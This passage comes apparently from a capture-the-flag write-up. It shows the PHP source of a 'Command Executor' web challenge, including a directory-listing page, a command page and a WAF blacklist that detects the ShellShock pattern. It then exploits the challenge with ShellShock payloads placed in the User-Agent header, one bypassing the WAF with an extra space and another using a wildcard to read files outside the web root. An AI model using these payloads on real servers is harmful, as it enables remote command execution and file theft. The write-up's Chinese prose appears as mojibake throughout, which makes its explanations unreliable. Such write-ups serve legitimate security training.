</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;img src=&#34;windows-run.jpg&#34; alt=&#34;command executor&#34;&gt;
</span></span><span class=line><span class=cl>&lt;?php }
</span></span><span class=line><span class=cl>?&gt;&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html lang=&#34;en&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Command Executor&lt;/title&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;bootstrap/css/bootstrap.min.css&#34; media=&#34;all&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;comic-neue/font.css&#34; media=&#34;all&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;style&gt;
</span></span><span class=line><span class=cl>      nav { margin-bottom: 1rem; }
</span></span><span class=line><span class=cl>      img { max-width: 100%; }
</span></span><span class=line><span class=cl>    &lt;/style&gt;
</span></span><span class=line><span class=cl>  &lt;/head&gt;
</span></span><span class=line><span class=cl>  &lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-dark d-flex&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;Command Executor&lt;/a&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      &lt;ul class=&#34;navbar-nav&#34;&gt;
</span></span><span class=line><span class=cl>&lt;?php foreach($pages as list($file, $title)): ?&gt;
</span></span><span class=line><span class=cl>        &lt;li class=&#34;nav-item&#34;&gt;
</span></span><span class=line><span class=cl>          &lt;a class=&#34;nav-link&#34; href=&#34;index.php?func=&lt;?=$file?&gt;&#34;&gt;&lt;?=$title?&gt;&lt;/a&gt;
</span></span><span class=line><span class=cl>        &lt;/li&gt;
</span></span><span class=line><span class=cl>&lt;?php endforeach; ?&gt;
</span></span><span class=line><span class=cl>      &lt;/ul&gt;
</span></span><span class=line><span class=cl>    &lt;/nav&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;div class=&#34;container&#34;&gt;&lt;?php if(is_callable(&#39;render&#39;)) render(); else render_default(); ?&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>  &lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p><code>man.php</code>æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;man&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[\w\-]+$/&#39;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Online documents&lt;/h1&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$cmds</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;bash&#39;</span><span class=p>,</span> <span class=s1>&#39;ls&#39;</span><span class=p>,</span> <span class=s1>&#39;cp&#39;</span><span class=p>,</span> <span class=s1>&#39;mv&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$cmd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=man&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ man %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;man %s | cat&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>untar.php</code>æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;h1&gt;Tar file tester&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;p&gt;Please upload a tar file to test&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; action=&#34;index.php?func=untar&#34; method=&#34;POST&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input type=&#34;file&#34; name=&#34;tarfile&#34; id=&#34;tarfile&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Upload &amp;amp; Test&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    if(isset($_FILES[&#39;tarfile&#39;])) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#39;, htmlentities($_FILES[&#39;tarfile&#39;][&#39;name&#39;]));
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        execute(sprintf(&#39;tar -tvf %s 2&gt;&amp;1&#39;, escapeshellarg($_FILES[&#39;tarfile&#39;][&#39;tmp_name&#39;])));
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p><code>ls.php</code>æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dirs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;..&#39;</span><span class=p>,</span> <span class=s1>&#39;../..&#39;</span><span class=p>,</span> <span class=s1>&#39;/etc/passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$dirs</span> <span class=k>as</span> <span class=nv>$dir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=ls&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;ls -l %s&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>cmd.php</code>æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;h1&gt;Command Execution&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>    echo &#39;&lt;ul&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    $cmds = [&#39;ls&#39;, &#39;env&#39;];
</span></span></span><span class=line><span class=cl><span class=err>    foreach($cmds as $c) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=cmd&amp;cmd=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;, $c);
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>    echo &#39;&lt;/ul&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;form action=&#34;index.php&#34; method=&#34;GET&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input type=&#34;hidden&#34; name=&#34;func&#34; value=&#34;cmd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;div class=&#34;input-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;input class=&#34;form-control&#34; type=&#34;text&#34; name=&#34;cmd&#34; id=&#34;cmd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;input-group-append&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>      &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Execute&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;script&gt;cmd.focus();&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    if(strlen($cmd) &gt; 0) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;h2&gt;$ %s&lt;/h2&gt;&#39;, htmlentities($cmd));
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        switch ($cmd) {
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;env&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls -l&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls -al&#39;:
</span></span></span><span class=line><span class=cl><span class=err>            execute($cmd);
</span></span></span><span class=line><span class=cl><span class=err>            break;
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;cat flag&#39;:
</span></span></span><span class=line><span class=cl><span class=err>            echo &#39;&lt;img src=&#34;cat-flag.png&#34; alt=&#34;cat flag&#34;&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>            break;
</span></span></span><span class=line><span class=cl><span class=err>        default:
</span></span></span><span class=line><span class=cl><span class=err>            printf(&#39;%s: command not found&#39;, htmlentities($cmd));
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>ls.php</code>æ¥æ‰¾<code>flag</code>äº†ï¼Œå› ä¸º<code>ls.php</code>æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨<code>func=ls&amp;file=../../../</code>å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src=https://blogpic.zdy.one/img/20190610008571.jpg loading=lazy></p><p>æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆå»è¯»äº†ï¼Œ<code>man.php</code>å› ä¸ºæœ‰<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>é™åˆ¶å¾—æ¯”è¾ƒæ­»ï¼Œ<code>untar.php</code>è²Œä¼¼åªæœ‰<code>tar -tvf</code>å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œåªæœ‰<code>cmd.php</code>ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒä¸å¤ªå¯»å¸¸çš„<code>env</code>è¿™ä¸ªå‘½ä»¤ï¼Œå…¶å®è¿™æ ·ä¹Ÿç®—æ˜¯æç¤ºå¾—æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œæ¯”è¾ƒå®¹æ˜“è®©äººæƒ³åˆ°ä¹Ÿå¯ä»¥æ¯”è¾ƒå®¹æ˜“æœåˆ°<code>ShellShock</code>æ¼æ´ï¼Œå¹¶ä¸”åœ¨<code>index.php</code>ä¸­å‘ç°æœ‰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$black_list</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;\/flag&#39;</span><span class=p>,</span> <span class=s1>&#39;\(\)\s*\{\s*:;\s*\};&#39;</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$black_list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$a</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$black_list</span> <span class=k>as</span> <span class=nv>$b</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>$b</span><span class=s2>/&#34;</span><span class=p>,</span> <span class=nv>$a</span><span class=p>)</span> <span class=o>===</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>fuck</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$b</span><span class=s2> detected! exit now.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_SERVER</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>===</span> <span class=s1>&#39;HTTP_&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$key</span><span class=s2>=</span><span class=si>$val</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å…³é”®å°±åœ¨<code>putenv</code>å‡½æ•°ï¼Œç”±äº<code>ShellShock</code>æ¼æ´ padyload éœ€è¦å‚æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>env <span class=nv>x</span><span class=o>=</span><span class=s1>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class=s2>&#34;echo this is a test&#34;</span> 
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>putenv</code>å®ç°å‚æ•°ä¼ é€’ï¼Œç›´æ¥è®¾ç½®<code>User-agent: () { :;}; echo 222222</code>ï¼Œå‘ç°è¢« waf</p><p><img src=https://blogpic.zdy.one/img/20190610000803.jpg loading=lazy></p><p>åˆ†æ waf ç»“åˆæ¼æ´æˆå› ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ€åçš„<code>};</code>ä¸­é—´æ·»åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ï¼Œè®¾ç½®<code>User-Agent: () { :;} ; echo 222222</code>ï¼ŒæˆåŠŸå‘ç°è¾“å‡º 22222 ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>() { _; } >_[$($())] { whoami; }</code>è¿™ä¸ª payload</p><p><img src=https://blogpic.zdy.one/img/20190610002148.jpg loading=lazy></p><p>å‘ç°å½“å‰ç”¨æˆ·ä¸º<code>www-data</code>ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰å‘ç°æ ¹ç›®å½•<code>flag</code>çš„æƒé™ä¸º<code>-r-------- 1 flag root 37 Jan 9 2018 flag</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»å–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ª<code>flag-reader</code>ä¸<code>flag-reader.c</code>çš„æ–‡ä»¶ï¼Œè¿™åº”è¯¥æ˜¯é¢˜ç›®æç¤ºäº†ã€‚å› ä¸º<code>index.php</code>åˆæŠŠ<code>flag</code>å…³é”®å­—å±è”½äº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½ç›´æ¥è¯»å–<code>flag-reader.c</code>ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨é€šé…ç¬¦è¯»å–ï¼Œä¾‹å¦‚ä½¿ç”¨<code>fla*.c</code></p><p>ä½¿ç”¨<code>() { _; } >_[$($())] { cat /fla*.c; }</code>å¾—åˆ°<code>flag-reader.c</code>æºç </p><p><img src=https://blogpic.zdy.one/img/20190610006944.jpg loading=lazy></p><p>Flag-reader.c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
